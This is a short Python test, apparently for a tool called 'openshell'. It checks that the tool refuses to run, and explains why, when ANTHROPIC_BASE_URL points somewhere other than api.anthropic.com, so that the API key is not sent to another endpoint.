def test_openshell_refuses_a_key_meant_for_another_endpoint(openshell, monkeypatch):
    pin(openshell)
    monkeypatch.setenv("ANTHROPIC_BASE_URL", "https://llm.corp.example/anthropic")
    r = invoke("run", "hello")
    assert r.exit_code != 0 and "sends ANTHROPIC_API_KEY to api.anthropic.com only" in r.output, r.output
